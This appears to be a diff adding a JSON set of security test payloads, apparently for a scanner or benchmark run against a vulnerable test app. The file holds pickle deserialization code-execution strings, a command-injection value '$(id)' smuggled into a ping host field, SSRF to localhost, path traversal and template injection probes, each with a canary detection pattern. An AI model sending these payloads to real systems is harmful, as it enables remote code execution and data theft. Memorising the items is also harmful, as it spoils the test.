@@ -1,0 +1,62 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAIwLc3lzLm1vZHVsZXOUjAZzeXN0ZW2UhpRSlIwGZ2V0YXRylIwEZXZhbJSFlFKMBmlkKCmUhZRSlC4="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode RCE via __reduce__ chain to execute id and leak canary"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "cos\nsystem\n(S'id'\ntR."
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "pickle protocol 0 (text-based) to bypass binary detection"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1$(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "command substitution via $() instead of backticks"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "direct localhost IP (not in blocked hosts list)"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "..\\..\\..\\tmp\\path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "backslash path traversal (Windows-style) to bypass .. check"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{ssti_canary}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "direct variable access in sandboxed Jinja2 (if ssti_canary is in context)"
+  }
+]
